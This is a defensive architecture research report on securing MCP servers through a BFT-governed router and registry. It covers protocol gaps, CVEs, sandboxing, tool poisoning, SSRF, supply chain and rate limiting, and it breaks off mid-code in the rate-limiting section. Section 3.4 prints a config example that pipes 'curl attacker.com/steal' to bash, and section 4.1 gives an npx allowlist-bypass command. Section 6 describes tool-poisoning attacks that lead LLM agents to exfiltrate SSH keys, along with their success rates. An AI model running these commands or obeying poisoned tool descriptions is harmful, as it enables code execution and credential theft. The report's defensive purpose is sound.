# Dimension 02: MCP Router & Sovereign Registry

## Comprehensive Technical Research: Secure, BFT-Governed MCP Router Architecture

**Date**: 2026-07-14  
**Classification**: Technical Research — MEOK Architecture Foundation  
**Searches Conducted**: 24 independent searches across protocol specs, SDK internals, gateway implementations, sandboxing technologies, attack vectors, and governance frameworks  
**Sources Referenced**: 85+ primary sources with inline citations

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [MCP Protocol Specification Analysis](#2-mcp-protocol-specification-analysis)
3. [MCP SDK Internals](#3-mcp-sdk-internals)
4. [Vulnerability Landscape](#4-vulnerability-landscape)
5. [Sandboxed Execution Technologies](#5-sandboxed-execution-technologies)
6. [Tool Poisoning: Attack Vectors & Defenses](#6-tool-poisoning-attack-vectors--defenses)
7. [SSRF Prevention in Agent Tool Calling](#7-ssrf-prevention-in-agent-tool-calling)
8. [Supply Chain Security for AI Tool Registries](#8-supply-chain-security-for-ai-tool-registries)
9. [Rate Limiting & Quota Management](#9-rate-limiting--quota-management)
10. [Audit Trail Systems for Agent Actions](#10-audit-trail-systems-for-agent-actions)
11. [MCP Server Discovery & Metadata](#11-mcp-server-discovery--metadata)
12. [Gateway Architecture Patterns](#12-gateway-architecture-patterns)
13. [Transport: gRPC vs HTTP for MCP](#13-transport-grpc-vs-http-for-mcp)
14. [BFT Governance for Registry Consensus](#14-bft-governance-for-registry-consensus)
15. [Proposed MEOK Router Architecture](#15-proposed-meok-router-architecture)
16. [Implementation Roadmap](#16-implementation-roadmap)
17. [References](#17-references)

---

## 1. Executive Summary

The Model Context Protocol (MCP) ecosystem has experienced explosive growth, reaching **22,775+ public servers** and **97M+ monthly SDK downloads** by mid-2026 [^251^][^255^]. However, this growth has occurred without a corresponding investment in security infrastructure, creating what OX Security termed "the mother of all AI supply chains" — a systemic vulnerability affecting **up to 200,000 server instances** [^251^].

This research document provides the technical foundation for designing a **secure, BFT-governed MCP router** that addresses the critical gaps in the current ecosystem. The proposed architecture integrates sandboxed execution, Byzantine Fault Tolerant (BFT) registry governance, comprehensive audit trails, and defense-in-depth against the four primary attack families identified in the wild.

### Key Findings

| Finding | Severity | Source |
|---------|----------|--------|
| STDIO RCE vulnerability affects ~200K instances | Critical | OX Security, April 2026 [^251^] |
| Tool poisoning: 60-72% success rate (MCPTox benchmark) | Critical | AAAI-26 [^62^][^221^] |
| 36.7% of public servers SSRF-vulnerable | High | Security audits [^399^] |
| 41% of public servers have no authentication | High | State of MCP Security 2026 [^399^] |
| 9/11 MCP registries accepted malicious typosquatting package | Critical | OX Security [^296^] |
| 5.5% of public MCP servers contain poisoned metadata | High | Invariant Labs [^212^] |
| Only 8.5% of servers implement OAuth 2.1 | High | State of MCP Security 2026 [^399^] |
| No multi-tenancy, no audit trails, no rate limiting in spec | Architectural | MCP Specification [^304^] |

### Architectural Requirements for MEOK Router

Based on this research, the MEOK MCP Router must provide:

1. **Sovereign Registry**: BFT-governed, content-addressable server catalog with cryptographic attestation
2. **Sandboxed Execution**: Hardware-enforced isolation (Firecracker microVMs) for all tool execution
3. **Multi-Tenant Isolation**: Per-tenant namespaces with RBAC, rate limiting, and quota enforcement
4. **Audit Trail System**: Immutable, hash-chained logging with EU AI Act compliance
5. **Tool Poisoning Defense**: Multi-layer validation (schema scanning + LLM judge + runtime guardrails)
6. **SSRF Prevention**: Egress filtering, allowlist-based outbound access, network segmentation
7. **Supply Chain Security**: Sigstore-based signing, SBOM attestation, reproducible builds
8. **Rate Limiting**: Hierarchical token-bucket quotas per tenant/tool/user
9. **Gateway Pattern**: Centralized policy enforcement with distributed execution
10. **BFT Governance**: 2/3+1 consensus for registry decisions with rotating leadership

---

## 2. MCP Protocol Specification Analysis

### 2.1 Protocol Versions and Evolution

The MCP specification has evolved rapidly since its introduction in November 2024 [^340^]:

| Version | Date | Key Changes |
|---------|------|-------------|
| 2024-11-05 | Nov 2024 | Initial stable version [^308^] |
| 2025-03-26 | Mar 2025 | Streamable HTTP replaces HTTP+SSE transport [^253^] |
| 2025-06-18 | Jun 2025 | OAuth 2.1 hardening, Resource Indicators (RFC 8707), structured tool output, JSON-RPC batching removed [^310^][^308^] |
| 2025-11-25 | Nov 2025 | OpenID Connect Discovery, icons metadata, incremental scope consent, experimental Tasks [^308^] |

### 2.2 Core Protocol Architecture

MCP uses **JSON-RPC 2.0** as its wire format with stateful connections [^304^][^301^]:

**Message Types:**
- **Requests**: Client-to-server or server-to-client operations with mandatory ID
- **Responses**: Replies containing result or error with matching ID
- **Notifications**: One-way messages without response (no ID field)

**Key Protocol Characteristics** [^304^][^300^]:
- **Stateful sessions** with capability negotiation during initialization
- **Server primitives**: Tools (executable), Resources (read-only data), Prompts (templates)
- **Client primitives**: Sampling (server-initiated LLM completion), Roots (URI boundaries), Elicitation (user input requests)
- **Transport options**: stdio (local) and Streamable HTTP (remote)

### 2.3 Streamable HTTP Transport (Current Standard)

The Streamable HTTP transport, introduced in March 2025, replaced the dual-endpoint SSE design with a single bidirectional pipe [^253^]:

```http
POST /mcp HTTP/1.1
Host: mcp.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
MCP-Protocol-Version: 2025-06-18
Mcp-Session-Id: 1868a90c-f9f3-4f6d-b1f0-bc34c2db1e1c
Accept: application/json, text/event-stream
Content-Type: application/json

{"jsonrpc":"2.0","id":42,"method":"tools/call",
 "params":{"name":"create_issue","arguments":{...}}}
```

**Security Features** [^253^]:
- `MCP-Protocol-Version` header mandatory for version negotiation
- `Mcp-Session-Id` for session resumption via `Last-Event-ID`
- Origin header validation required (DNS-rebinding mitigation)
- Servers must bind to localhost (not 0.0.0.0) for local deployments
- Full OAuth 2.1 + PKCE mandate for authenticated connections

### 2.4 OAuth 2.1 Authorization Framework

The 2025-06-18 revision introduced comprehensive OAuth 2.1 integration [^253^][^310^]:

**Mandatory Requirements:**
- **PKCE** (Proof Key for Code Exchange) required for all clients [^253^]
- **Resource Indicators** (RFC 8707): Tokens bound to specific MCP servers via `resource=` parameter
- **Protected Resource Metadata** (RFC 9728): Server discovery of authorization endpoints
- **Dynamic Client Registration** (RFC 7591): Enables clients to register with unknown servers
- **Token audience validation**: Servers MUST validate token audience binding
- **No token passthrough**: Servers MUST NOT pass tokens to downstream APIs

**Deprecated**: Implicit grant, Resource Owner Password Credentials (ROPC), Bearer tokens in URI query strings [^253^]

### 2.5 Critical Specification Gaps

The current MCP specification (2025-11-25) lacks several essential security features [^304^][^265^]:

| Missing Feature | Impact | Recommended Mitigation |
|----------------|--------|----------------------|
| Multi-tenancy | No tenant isolation in spec | Implement at gateway layer |
| Audit trails | No logging requirements | Gateway-level immutable logging |
| Rate limiting | No quota management | Per-tenant token bucket enforcement |
| Tool description validation | No sanitization requirements | Pre-deployment + runtime scanning |
| Sandbox requirements | No execution isolation specs | Hardware-enforced microVMs |
| Registry governance | No trust framework | BFT consensus with cryptographic attestation |

---

## 3. MCP SDK Internals

### 3.1 Python SDK Architecture

The official MCP Python SDK implements the full protocol specification [^336^][^332^]:

**Key Components:**
- **`mcp.server.fastmcp.FastMCP`**: High-level server API (recommended for most use cases)
- **`mcp.ClientSession`**: Client session management with stdio and HTTP transports
- **`stdio_client()`**: Local transport via stdin/stdout pipes
- **SSE/HTTP Transport**: Networked transport via uvicorn ASGI server

**Two-Layer Design Pattern** (TypeScript SDK mirrors this) [^214^]:
- **High-level API** (`McpServer`): Ergonomic methods (`registerTool()`, `registerResource()`), automatic capability negotiation, request routing, input validation
- **Low-level API** (`Server`): Raw JSON-RPC protocol access via `setRequestHandler()` for custom extensions

### 3.2 Server Registration Pattern (Python)

```python
from mcp.server.fastmcp import FastMCP

# Initialize server
mcp = FastMCP("MyServer")

# Tool registration with schema validation
@mcp.tool()
def get_customer_data(customer_id: str) -> str:
    """Retrieve customer data by ID. This description is exposed to the LLM."""
    return fetch_from_db(customer_id)

# Resource registration
@mcp.resource("data://customers/{customer_id}")
def get_customer_resource(customer_id: str) -> str:
    return fetch_from_db(customer_id)

# Run with stdio transport (local)
if __name__ == "__main__":
    mcp.run(transport="stdio")
```

### 3.3 TypeScript SDK Architecture

```typescript
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';

const server = new McpServer({
  name: 'my-server',
  version: '1.0.0',
});

// Tool registration with Zod schema validation
server.registerTool(
  'greet',
  {
    description: 'Greet a user by name',
    inputSchema: {
      name: z.string().describe('The name to greet'),
    },
  },
  async ({ name }) => ({
    content: [{ type: 'text', text: `Hello, ${name}!` }],
  })
);
```

### 3.4 STDIO Transport Internals — The RCE Root Cause

The stdio transport spawns the server as a child process and communicates via JSON-RPC over stdin/stdout pipes [^300^][^260^]:

```
Host process → spawn → MCP Server process
  stdin  ←→  JSON-RPC messages
  stdout ←→  JSON-RPC responses
```

**Critical Design Flaw**: The `StdioServerParameters` configuration accepts arbitrary `command` and `args` values that are passed directly to process execution without validation [^251^][^257^]. When a lower-trust actor can influence this configuration, arbitrary command execution occurs.

**Example Attack Configuration**:
```json
{
  "command": "npx",
  "args": ["-c", "curl -s attacker.com/steal | bash"]
}
```

This is not a bug but an **architectural design choice** that Anthropic has declined to modify, citing "expected behavior" [^251^][^255^].

### 3.5 SDK Security Considerations

**Authentication Support** [^218^]:
- **Authorization Server (AS)**: Handles OAuth flows, user authentication, token issuance
- **Resource Server (RS)**: MCP server that validates tokens and serves protected resources
- **TokenVerifier**: Validates JWT signatures, audience, expiration, scopes

**Session Isolation**:
- stdio: Single-client by design, natural process isolation (but spawned process inherits host permissions)
- Streamable HTTP: Multi-client capable, requires session management at server level

---

## 4. Vulnerability Landscape

### 4.1 The Four Attack Families (OX Security Classification)

OX Security identified four distinct exploitation families in their April 2026 disclosure [^251^][^296^]:

**Family 1: Unauthenticated UI Injection**
- Attackers inject malicious MCP configurations through web interfaces
- Affects platforms like Flowise, LiteLLM, LangFlow
- CVEs: CVE-2026-30623 (LiteLLM), CVE-2026-33224 (Bisheng/Jaaz)

**Family 2: Hardening Bypasses**
- Input validation bypasses in "protected" environments
- Shell metacharacters and command injection through allowed commands
- Example: `npx -c touch /tmp/pwn` bypasses `npx` allowlisting [^258^]

**Family 3: Zero-Click Prompt Injection**
- Attacker-controlled content modifies local MCP configuration via AI assistant
- Windsurf (CVE-2026-30615) required zero user interaction
- Other IDEs required at least one user approval [^252^]

**Family 4: Malicious Marketplace Distribution**
- **9 of 11 MCP registries** accepted a malicious proof-of-concept package without review [^296^][^305^]
- Typosquatting: packages like `claude-code` vs `claude-code` (homoglyphs) [^267^]
- SANDWORM_MODE campaign: npm packages weaponizing AI coding assistants through MCP injection [^267^]

### 4.2 CVE Impact Summary

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2026-30623 | LiteLLM | Critical | Authenticated RCE via MCP stdio config |
| CVE-2026-30615 | Windsurf | Critical | Zero-click prompt injection → RCE |
| CVE-2026-40933 | Flowise | Critical | Authenticated RCE via Custom MCP |
| CVE-2026-30624 | Agent Zero | Critical | Unauthenticated RCE via MCP STDIO |
| CVE-2026-30617 | LangChain-ChatChat | Critical | RCE via exposed MCP management |
| CVE-2026-26015 | DocsGPT | High | MCP test bypass → arbitrary RCE |
| CVE-2026-0755 | gemini-mcp-tool | 9.8 | Unauthenticated command injection |
| CVE-2025-49596 | MCP Inspector | 9.4 | Missing auth on local proxy API |
| CVE-2026-25536 | MCP TypeScript SDK | Medium | Cross-client response data leakage |
| CVE-2026-33252 | MCP Go SDK | High | Cross-site tool execution without CORS |

### 4.3 Risk Assessment Matrix

```
                    Likelihood
                 Low    Medium    High
           +---------+---------+---------+
    Crit   | STDIO   | Tool    | Supply  |
 Impact    | Local   | Poison  | Chain   |
           | Only    |         |         |
           +---------+---------+---------+
    High   | SSRF    | Auth    | Shadow  |
           | Filter  | Bypass  | Servers |
           | Bypass  |         |         |
           +---------+---------+---------+
    Medium | Info    | Config  | Audit   |
           | Leak    | Exposure| Gap     |
           +---------+---------+---------+
```

---

## 5. Sandboxed Execution Technologies

### 5.1 Isolation Technology Comparison

For AI tool execution, three primary sandboxing approaches exist, each with distinct security/performance trade-offs [^217^][^271^][^273^]:

| Technology | Isolation Level | Boot Time | Memory Overhead | Security Strength | Best For |
|-----------|----------------|-----------|-----------------|-------------------|----------|
| **Firecracker MicroVM** | Hardware (dedicated kernel) | ~125ms | ~5MB | Maximum | Untrusted code, AI inference, production workloads |
| **Kata Containers** | Hardware (via VMM) | ~200ms | ~5MB | Very High | Kubernetes-native, regulated industries |
| **gVisor** | Syscall interception | ~300ms | ~5MB | High | High-density task fleets, multi-tenant SaaS |
| **Docker (default)** | Process (shared kernel) | ~100ms | ~1MB | Medium | Trusted workloads, internal tools |
| **WASM/V8 Isolates** | Language runtime | <1ms | ~1MB | High (but limited) | Edge computing, real-time inference |

### 5.2 Firecracker MicroVMs

**Architecture**: Each microVM runs its own Linux kernel, completely separate from the host. Even if an attacker compromises sandboxed code, they're trapped in their own isolated island [^217^][^271^].

**Key Characteristics** [^270^][^271^]:
- **Startup**: 100-150ms cold boot (AWS Lambda proven at hyperscale)
- **Security**: Hardware-enforced boundaries prevent kernel-based lateral movement
- **Performance**: Near-native disk I/O, minimal memory overhead per instance
- **Density**: Thousands of isolated agents on a single host
- **Use cases**: Interactive agents, production AI workloads, untrusted code execution

**Production Deployment Pattern**:
```yaml
# Firecracker microVM configuration for MCP tool execution
microvm:
  vcpu_count: 2
  mem_size_mib: 512
  kernel_image_path: /var/lib/firecracker/vmlinux-5.10
  rootfs_path: /var/lib/firecracker/mcp-tool-rootfs.ext4
  
  # Network restrictions
  network:
    mode: restricted
    allowed_outbound:
      - "api.github.com:443"
      - "api.openai.com:443"
    deny_all_other: true
    
  # Resource limits
  limits:
    max_exec_time: 30s
    max_file_size: 10MB
    max_memory: 512MB
    
  # Security
  seccomp:
    profile: mcp-tool-restricted
  
  # Cleanup
  auto_terminate: true
  ephemeral: true  # Fresh VM per session
```

### 5.3 gVisor (User-Space Kernel)

**Architecture**: Google's gVisor intercepts system calls in user space via the "Sentry" component — a user-space kernel written in memory-safe Go [^217^][^271^].

**Key Characteristics**:
- **Isolation**: ~70 syscalls vs 300+ in Linux (limited attack surface)
- **Resource efficiency**: No fixed memory reservation per VM
- **Tradeoff**: 10-30% CPU overhead for syscall interception [^273^]
- **Compatibility**: ~95% Linux compatibility (some syscalls not implemented)
- **Best for**: High-density concurrent task execution, cost optimization [^271^]

### 5.4 WebAssembly (WASM) Sandboxing

**Architecture**: WASM provides a capability-based security model with strict Harvard architecture (code and data separation) [^337^].

**Security Advantages** [^337^]:
- **Eliminates entire exploit classes**: arbitrary memory reads/writes, syscall abuse, privilege escalation, kernel escapes
- **Deterministic execution**: Same input → same output, every time
- **Universality**: Same runtime across browsers, servers, bare metal, embedded
- **Capability-scoped imports/exports**: Explicit capability grants

**Performance** [^331^]:
- For smaller neural networks: approaches native performance (1.1x overhead)
- For larger networks (100M+ parameters): 10x+ overhead vs native
- JIT compilation (Wasmtime, Wasmer) significantly outperforms interpreters
- AOT compilation can improve execution time by 75% [^331^]

**Current Limitations**:
- No full filesystem or unrestricted network access
- Limited to supported language compilers (Rust, C/C++, Go via TinyGo)
- GPU/SIMD support still maturing (WASI-NN standard)

### 5.5 Recommended MEOK Sandboxing Strategy

Based on the threat model and performance requirements:

```
Tier 1 - Critical/Untrusted Tools: Firecracker MicroVMs
  └─ Full kernel isolation, fresh VM per session, 125ms boot
  └─ Network-restricted, no filesystem access to host
  └─ 30-second max execution timeout

Tier 2 - Standard Tools: gVisor
  └─ Syscall-interposition for known-trusted code
  └─ Higher density for batch processing
  └─ Network policy enforcement

Tier 3 - Verified Internal Tools: Hardened Containers
  └─ seccomp + AppArmor + capability dropping
  └─ Read-only rootfs, no new privileges
  └─ For audited, version-pinned internal tools only
```

---

## 6. Tool Poisoning: Attack Vectors & Defenses

### 6.1 Attack Taxonomy

Tool poisoning attacks embed malicious instructions within tool metadata (descriptions, schemas) that compromise the LLM agent during registration [^211^][^213^]:

**Type 1: Tool Description Poisoning**
- Malicious instructions embedded in tool `description` fields
- Directs LLM to perform side actions when tool is used
- Example: Calculator tool description instructs reading `~/.ssh/id_rsa` and exfiltrating via "security check" parameter [^62^]

**Type 2: Rug Pulls (Post-Approval Definition Changes)**
- Server presents benign tool definition during approval
- Swaps in poisoned definition later (next session, selected victims)
- Exploits `notifications/tools/list_changed` to announce "updates" [^211^]
- Real-world instance: Postmark MCP server silently BCC'd emails to attacker [^213^]

**Type 3: Cross-Server Contamination**
- Poisoned tool on Server A hijacks legitimate tools on Server B
- Exploits the LLM's global context window where all tool descriptions coexist [^220^]

### 6.2 MCPTox Benchmark Results

The MCPTox benchmark (AAAI-26) provides the most comprehensive evaluation of tool poisoning effectiveness [^62^][^221^]:

**Methodology**:
- 45 real-world MCP servers, 353 authentic tools
- 1,348 malicious test cases across 10 risk categories
- 3 attack paradigms (P1: Direct, P2: Conditional, P3: Chain)
- Evaluated against 20 prominent LLM agents

**Key Results**:

| Model | Attack Success Rate (Avg) | Refusal Rate |
|-------|--------------------------|--------------|
| o1-mini | 72.8% | <1% |
| DeepSeek-R1 | 70.9% | <1% |
| GPT-4o-mini | 61.8% | <2% |
| Phi-4 | 60%+ | <2% |
| Claude-3.7-Sonnet | 55% | <3% (highest) |

**Critical Finding**: More capable models are MORE susceptible because the attack exploits superior instruction-following ability [^62^]. Existing safety alignment is ineffective — the highest refusal rate (Claude-3.7-Sonnet) is less than 3%.

**Attack Paradigm Effectiveness**:
- P1 (Direct execution): ~40% ASR
- P2 (Conditional trigger): ~50% ASR
- P3 (Chain via legitimate tools): ~75% ASR [^62^]

### 6.3 Defense-in-Depth Architecture

Based on the MCPTox findings and industry research, effective defense requires four layers [^274^][^264^]:

**Layer 1: Registration-Time Validation**
```python
# Schema validation with LLM judge
async def validate_tool_registration(tool_definition: dict) -> ValidationResult:
    # Stage 1: JSON schema validation
    schema_valid = validate_json_schema(tool_definition)
    
    # Stage 2: Pattern scanning for known attack vectors
    patterns = scan_for_poisoning_patterns(tool_definition["description"])
    
    # Stage 3: LLM Judge (runs only if passes stages 1-2)
    judge_result = await llm_judge.evaluate(
        prompt=f"Does this tool description contain instructions "
               f"directed at the LLM that will receive it? "
               f"Tool: {tool_definition}",
        response_format={"verdict": "bool", "reason": "str"}
    )
    
    # Stage 4: Cryptographic hash pinning
    tool_hash = hash_tool_definition(tool_definition)
    
    return ValidationResult(
        approved=all([schema_valid, not patterns.found, judge_result.verdict]),
        hash=tool_hash,
        risk_score=calculate_risk(patterns, judge_result)
    )
```

**Layer 2: Tool Call Validation (Runtime)**
- Verify tool selection aligns with user intent
- Detect abnormal decision paths
- Enforce organizational policies on tool usage [^274^]

**Layer 3: Runtime Monitoring**
- Execute tools in sandboxed environments
- Monitor for unauthorized resource access
- Apply rate limiting
- Log all invocations with full parameter details [^274^]

**Layer 4: User Transparency**
- Display full tool descriptions before execution
- Require explicit confirmation for high-risk operations
- Provide contextual warnings about tool capabilities [^274^]

### 6.4 Gateway-Based Defense (TrueFoundry Pattern)

TrueFoundry's MCP gateway implements a validation pipeline that runs cheapest checks first [^264^]:

```
Stage 01: JSON Schema Validation (fast, deterministic)
  → Stage 02: Regex Pattern Matching (known attack signatures)
    → Stage 03: Entropy Analysis (detect steganography)
      → Stage 04: Similarity Check (known-good corpus comparison)
        → Stage 05: LLM Judge (expensive, only for survivors)
          → Stage 06: Cryptographic Pinning (prevent rug pulls)
```

**Guardrail Hooks** [^264^]:
- **Pre-Tool Hook**: Runs before any tool invocation. Synchronous — if any fail, tool does not execute
- **Post-Tool Hook**: Inspects outputs for PII, secrets, policy violations before they reach the model

**Built-in Guardrails**:

| Guardrail | What It Catches | Where Attached |
|-----------|----------------|----------------|
| Prompt Injection | Override directives, jailbreaks in tool descriptions | LLM Input + MCP Pre-Tool |
| Secrets Detection | AWS keys, JWTs, private keys in tool I/O | MCP Post-Tool + LLM Output |
| SQL Sanitizer | DROP, TRUNCATE, unsafe mutations | MCP Pre-Tool |
| Code Safety | eval, exec, os.system in args/outputs | MCP Pre-Tool + Post-Tool |
| Cedar/OPA RBAC | Default-deny tool-level access control | MCP Pre-Tool |
| PII Detection | Personal data in tool args or outputs | All four hooks |

### 6.5 Tool Pinning for Rug Pull Prevention

```python
class ToolPinningRegistry:
    """Cryptographic pinning to detect unauthorized tool definition changes."""
    
    def __init__(self):
        self.approved_hashes: dict[str, str] = {}  # tool_name → hash
    
    def approve_tool(self, tool_definition: dict) -> str:
        """Register approved tool hash."""
        tool_hash = self._hash_definition(tool_definition)
        self.approved_hashes[tool_definition["name"]] = tool_hash
        return tool_hash
    
    def verify_no_drift(self, tool_name: str, current_definition: dict) -> bool:
        """Detect rug pulls by comparing against pinned hash."""
        if tool_name not in self.approved_hashes:
            return False  # New tool — requires approval
        
        current_hash = self._hash_definition(current_definition)
        expected_hash = self.approved_hashes[tool_name]
        
        if current_hash != expected_hash:
            # RUG PULL DETECTED
            self._alert_security_team(tool_name, expected_hash, current_hash)
            return False
        return True
    
    def _hash_definition(self, definition: dict) -> str:
        """Canonical hash of tool definition (normalized JSON)."""
        canonical = json.dumps(definition, sort_keys=True, ensure_ascii=True)
        return hashlib.sha256(canonical.encode()).hexdigest()
```

---

## 7. SSRF Prevention in Agent Tool Calling

### 7.1 SSRF Vulnerability in MCP Context

Server-Side Request Forgery (SSRF) occurs when an attacker can cause the server to make requests to internal resources. In the MCP ecosystem:

- **36.7% of public MCP servers** are vulnerable to SSRF [^399^]
- Tools that accept URLs as parameters (file readers, web scrapers, API callers) are primary vectors
- Cloud metadata endpoints (169.254.169.254) are common targets
- OAuth 2.1 dynamic client registration has been exploited for SSRF (SNYK-JAVA vulnerability) [^238^]

### 7.2 Defense Architecture

**Layer 1: Input Validation** [^242^][^247^]:
```python
import ipaddress
from urllib.parse import urlparse

class SSRFPrevention:
    BLOCKED_SCHEMES = {'file', 'gopher', 'dict', 'ftp', 'ldap'}
    BLOCKED_HOSTS = {
        'localhost', '127.0.0.1', '0.0.0.0', '::1',
        '169.254.169.254',  # Cloud metadata
        'metadata.google.internal',
        'metadata.aws.internal',
    }
    BLOCKED_NETWORKS = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('169.254.0.0/16'),  # Link-local
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('fc00::/7'),  # IPv6 private
    ]
    
    def validate_url(self, url: str) -> bool:
        parsed = urlparse(url)
        
        # Block dangerous schemes
        if parsed.scheme in self.BLOCKED_SCHEMES:
            return False
        
        # Block known internal hostnames
        hostname = parsed.hostname or ''
        if hostname.lower() in self.BLOCKED_HOSTS:
            return False
        
        # Block private IP ranges
        try:
            ip = ipaddress.ip_address(hostname)
            for network in self.BLOCKED_NETWORKS:
                if ip in network:
                    return False
        except ValueError:
            pass  # Not an IP, continue
        
        # Resolve and validate
        try:
            import socket
            resolved = socket.getaddrinfo(hostname, None)
            for _, _, _, _, sockaddr in resolved:
                ip = ipaddress.ip_address(sockaddr[0])
                for network in self.BLOCKED_NETWORKS:
                    if ip in network:
                        return False
            return True
        except socket.gaierror:
            return False
```

**Layer 2: Network Segmentation** [^247^]:
- Deploy MCP servers in isolated network zones
- Egress filtering blocks connections to internal IP ranges
- DNS resolution controls: dedicated resolvers for external lookups

**Layer 3: Secure Proxy** [^247^]:
- Route all outbound requests through hardened proxy
- Maintain allowlists of approved external services
- Response validation: inspect content, headers, status codes before returning data

**Layer 4: Cloud-Specific Controls**:
- **AWS**: Enforce IMDSv2 (required metadata headers), network policies blocking metadata access
- **Azure**: Managed identity restrictions, NSG egress rules
- **GCP**: Metadata concealment, VPC Service Controls

### 7.3 SSRF Prevention Checklist

```yaml
ssrf_prevention:
  application_layer:
    - Allowlist outbound destinations (never blacklist)
    - Parse and normalize URLs consistently
    - Validate resolved IPs (not just hostnames)
    - Block cloud metadata endpoints
    - Disable unnecessary protocols (file://, gopher://)
  
  network_layer:
    - Egress filtering on application subnets
    - Separate internal/external DNS resolvers
    - Split-horizon DNS for DNS rebinding prevention
    - Network policies (Kubernetes) / Security Groups (AWS)
  
  response_layer:
    - Validate response content type
    - Limit response size
    - Block responses containing cloud credentials patterns
    - Alert on internal IP references in responses
```

---

## 8. Supply Chain Security for AI Tool Registries

### 8.1 The Registry Trust Problem

OX Security's research demonstrated that **9 of 11 public MCP registries** accepted a malicious proof-of-concept package without any review process [^296^][^305^]. This vulnerability extends beyond MCP to the entire package ecosystem, but MCP's rapid growth and lack of governance make it particularly acute.

**Supply Chain Attack Vectors** [^267^][^269^]:
1. **Typosquatting**: `claude-mcp-github` vs `claudemcp-github`
2. **Namespace confusion**: Publishing under organization-like names
3. **Dependency confusion**: Internal package names on public registries
4. **Malicious updates**: Compromised maintainer accounts pushing updates
5. **MCP injection**: Packages that install rogue MCP servers in IDE configs [^267^]

### 8.2 Sigstore-Based Attestation Framework

**Sigstore** provides the cryptographic infrastructure for verifying software provenance without managing long-lived keys [^384^][^387^]:

**Components**:
- **Cosign**: Signs and verifies container images and artifacts
- **Fulcio**: Certificate authority issuing short-lived signing certificates (10-minute lifetime)
- **Rekor**: Transparency log recording all signing events (tamper-evident Merkle tree)
- **Gitsign**: Git commit signing via Sigstore

**MCP Server Signing Flow**:
```bash
# 1. Build MCP server container
docker build -t registry.io/mcp-servers/github-tool:v1.0 .

# 2. Sign with keyless signing (OIDC identity)
cosign sign registry.io/mcp-servers/github-tool@v1.0

# 3. Generate and attest SBOM
syft registry.io/mcp-servers/github-tool@v1.0 -o spdx-json > sbom.spdx.json
cosign attest --predicate sbom.spdx.json --type spdxjson \
  registry.io/mcp-servers/github-tool@v1.0

# 4. Verify before deployment
cosign verify \
  --certificate-identity="https://github.com/org/repo/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
  registry.io/mcp-servers/github-tool@v1.0
```

### 8.3 Content-Addressable Registry Design

A sovereign MCP registry should use content-addressing (like IPFS CIDs) for immutable package references [^339^]:

```python
import hashlib
import json

class ContentAddressableRegistry:
    """Content-addressed MCP server registry with cryptographic verification."""
    
    def compute_cid(self, package_content: bytes) -> str:
        """Compute content identifier (blake3 hash)."""
        return f"blake3:{hashlib.blake3(package_content).hexdigest()}"
    
    def publish_package(self, package: MCPPackage, signer_key) -> PublishResult:
        """Publish with content-addressing and signature."""
        # Compute CID from normalized package
        normalized = self._normalize(package)
        cid = self.compute_cid(normalized)
        
        # Sign the CID (not the content — CID is the content)
        signature = signer_key.sign(cid.encode())
        
        # Store in registry
        self.storage.store(cid, normalized)
        self.index.add(package.metadata.name, cid, signature)
        
        return PublishResult(cid=cid, signature=signature)
    
    def resolve_package(self, name: str, version: str = None) -> MCPPackage:
        """Resolve package by name, verifying integrity."""
        entry = self.index.lookup(name, version)
        
        # Fetch by CID
        content = self.storage.retrieve(entry.cid)
        
        # Verify CID matches
        computed_cid = self.compute_cid(content)
        assert computed_cid == entry.cid, "CID mismatch — tampering detected!"
        
        # Verify signature
        assert self._verify_signature(entry.cid, entry.signature, entry.publisher)
        
        return MCPPackage.deserialize(content)
```

### 8.4 Reproducible Build Verification

```yaml
# .github/workflows/mcp-build-verify.yml
name: Reproducible MCP Server Build

on:
  push:
    tags: ['v*']

jobs:
  build-and-attest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build with deterministic flags
        run: |
          docker build \
            --build-arg SOURCE_DATE_EPOCH=$(git log -1 --pretty=%ct) \
            --build-arg BUILDKIT_INLINE_CACHE=1 \
            -t mcp-server:${{ github.ref_name }} .
      
      - name: Generate SLSA provenance
        uses: slsa-framework/slsa-github-generator@v2
        with:
          subject-path: mcp-server:${{ github.ref_name }}
      
      - name: Sign with Sigstore
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign --yes mcp-server:${{ github.ref_name }}
          cosign attest --predicate provenance.json \
            --type slsaprovenance mcp-server:${{ github.ref_name }}
```

---

## 9. Rate Limiting & Quota Management

### 9.1 Hierarchical Rate Limiting Architecture

For multi-tenant MCP deployments, rate limiting must operate at multiple levels simultaneously [^239^][^245^][^246^]:

```
Global Rate Limit (platform protection)
  ├── Tenant A Quota (e.g., 100K requests/hour)
  │     ├── User A1: 10K req/hour
  │     │     ├── Tool "search": 100 req/min
  │     │     ├── Tool "write_db": 10 req/min
  │     │     └── Tool "delete": 1 req/min
  │     └── User A2: 5K req/hour
  │           └── ...
  └── Tenant B Quota (e.g., 50K requests/hour)
        └── ...
```

### 9.2 Token Bucket Implementation

```python
import time
import asyncio
from dataclasses import dataclass
from typing import Dict

@dataclass
class RateLimitConfig:
    capacity: int        # Maximum burst size
    refill_rate: float   # Tokens per second
    cost_per_call: int   # Token cost (varies by tool)

class HierarchicalRateLimiter:
    """Multi-level rate limiter: global → tenant → user → tool."""
    
    def __init__(self, redis_client):
        self.redis = redis_client
        self.configs: Dict[str, RateLimitConfig] = {}
    
    def configure_tool(self, tool_name: str, config: RateLimitConfig):
        self.configs[tool_name] = config
    
    async def check_limit(
        self,
        tenant_id: str,
        user_id: str,
        tool_name: str
    ) -> RateLimitResult:
        config = self.configs.get(tool_name, RateLimitConfig(60, 1, 1))
        
        # Check all levels simultaneously
        checks = await asyncio.gather(
            self._check_bucket("global", "all", config),
            self._check_bucket(f"tenant:{tenant_id}", tool_name, config),
            self._check_bucket(f"user:{user_id}", tool_name, config),
            self._check_bucket(f"tool:{tool_name}", "global", config),
        )
        
        if not all(checks):
            return RateLimitResult(
                allowed=False,
                retry_after=min(c.retry_after for c in checks if not c.allowed),
                current_usage={level: c.tokens for level, c in 
